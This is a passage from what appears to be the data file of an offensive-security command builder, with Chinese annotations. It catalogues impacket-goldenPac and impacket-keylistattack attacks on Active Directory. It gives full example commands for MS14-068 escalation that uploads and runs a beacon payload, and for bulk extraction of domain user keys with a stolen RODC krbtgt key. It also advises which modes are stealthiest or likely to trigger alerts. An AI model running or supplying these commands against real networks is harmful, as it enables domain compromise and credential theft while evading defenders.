说明: 保存后的 ccache 可 export KRB5CCNAME 后配合任何 impacket 工具 -k -no-pass 使用，
比一次性 PSEXEC 更灵活，也避免在目标上落地服务。`,
        example: 'impacket-goldenPac corp.local/alice:Password123@dc01.corp.local -dc-ip 10.0.0.10 -w alice.ccache None',
      },
      {
        id: 'goldenpac-upload',
        title: '上传并执行载荷',
        description: '-c 上传本地文件后在目标执行，参数由 command 位置参数传入',
        build: (p) => `impacket-goldenPac ${buildImpacketAuth(p, { kerberos: false, aesKey: false, targetIp: true })} -c ${v(p.fileName, 'PAYLOAD.EXE')}`,
        usage: `位置参数:
  target    [[domain/]username[:password]@]<targetName>
  command   使用 -c 时此处为被上传程序的参数 (无路径)
关键参数:
  -c PATH    上传的本地文件路径，上传后在目标上执行
  -dc-ip IP / -target-ip IP  域控与目标 IP
说明: 等价于 MS14-068 提权 + PSEXEC 上传执行的一条龙，适合投放 beacon/采集工具。`,
        example: 'impacket-goldenPac corp.local/alice:Password123@dc01.corp.local -dc-ip 10.0.0.10 -c beacon.exe',
      },
    ],
  },
  {
    id: 'keylistattack',
    name: 'impacket-keylistattack',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/keylistattack.py',
    description: 'KERB-KEY-LIST-REQ 攻击 - 持 RODC krbtgt 密钥时，无需在目标落地 agent 即可批量导出域用户密钥 (RODC 复制妥协后的秘密榨取)',
    commands: [
      {
        id: 'keylistattack-basic',
        title: '指定 RODC 密钥榨取秘密',
        description: '-rodcNo 为 RODC 的 krbtgt 账户编号，-rodcKey 为该 RODC 的 AES Key',
        build: (p) => `impacket-keylistattack ${buildImpacketAuth(p, { targetIp: true })} -rodcNo ${v('', 'RODC_NUMBER')} -rodcKey ${v('', 'RODC_AESKEY')}`,
        usage: `位置参数:
  target    [[domain/]username[:password]@]<KDC主机名或IP>；低权限账户即可，
            用于 SMB 认证并枚举域用户 (或写 LIST 配合 LIST 选项)
关键参数:
  -rodcNo N      RODC krbtgt 账户编号 (krbtgt_XXXXX 中的数字部分)
  -rodcKey KEY   该 RODC krbtgt 账户的 AES Key
  -full          对全部域用户发起攻击 (噪音大，可能导致更多 TGS 请求被拒)
  -dc-ip IP / -target-ip IP  域控/目标 IP (主机名无法解析时)
说明: KERB-KEY-LIST-REQ 是 RODC 为可写 DC 提供的密钥清单请求。RODC 被完全控制
(拿到其 krbtgt 密钥) 后，攻击者可冒充 RODC 向可写 DC 批量索要用户密钥。`,
        example: 'impacket-keylistattack corp.local/alice:Password123@dc01.corp.local -rodcNo 35742 -rodcKey 5b4b8f2c3a1d9e7f6a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f',
      },
      {
        id: 'keylistattack-full',
        title: '榨取全部域用户 (-full)',
        description: '对枚举到的所有域用户执行攻击；噪音大且部分 TGS 请求可能被拒',
        build: (p) => `impacket-keylistattack ${buildImpacketAuth(p, { targetIp: true })} -rodcNo ${v('', 'RODC_NUMBER')} -rodcKey ${v('', 'RODC_AESKEY')} -full`,
        usage: `位置参数:
  target    [[domain/]username[:password]@]<KDC主机名或IP>
关键参数:
  -full          对全部域用户发起 KERB-KEY-LIST-REQ (默认只针对高价值目标)
  -rodcNo N / -rodcKey KEY  RODC krbtgt 编号与 AES Key (必填)
警告: -full 会产生大量 TGS-REQ 流量，极易触发告警；部分请求可能因目标不在
RODC 允许复制名单 (msDS-RevealOnDemandGroup) 而被 KDC 拒绝。`,
        example: 'impacket-keylistattack corp.local/alice:Password123@dc01.corp.local -rodcNo 35742 -rodcKey 5b4b8f2c3a1d9e7f6a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f -full',
      },
      {
        id: 'keylistattack-list',
        title: 'LIST 模式针对单个用户',
        description: 'target 写 LIST，配合 -domain/-kdc/-t 精确打击单个用户，无需 SMB 枚举',
        build: (p) => `impacket-keylistattack LIST -domain ${v(p.domain, 'DOMAIN')} -kdc ${v(p.dcFQDN, 'KDC_HOST')} -rodcNo ${v('', 'RODC_NUMBER')} -rodcKey ${v('', 'RODC_AESKEY')} -t ${v('', 'TARGET_USER')}`,
        usage: `位置参数:
  target    写 LIST，表示不通过 SMB 枚举用户，改用 LIST 选项指定目标
LIST 选项 (仅配合 LIST 使用):
  -domain DOMAIN  域 FQDN
  -kdc KDC        KDC 主机名或 FQDN
  -t USER         只攻击指定用户名
  -tf FILE        攻击文件中列出的用户名 (每行一个)
  -rodcNo N / -rodcKey KEY  RODC krbtgt 编号与 AES Key (必填)
说明: 已有目标用户名列表或只想打点高价值账户 (如 krbtgt、Administrator) 时，
LIST 模式跳过 SMB 用户枚举，流量最小、最隐蔽。`,
        example: 'impacket-keylistattack LIST -domain corp.local -kdc dc01.corp.local -rodcNo 35742 -rodcKey 5b4b8f2c3a1d9e7f6a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f -t Administrator',
      },
    ],
  },
];
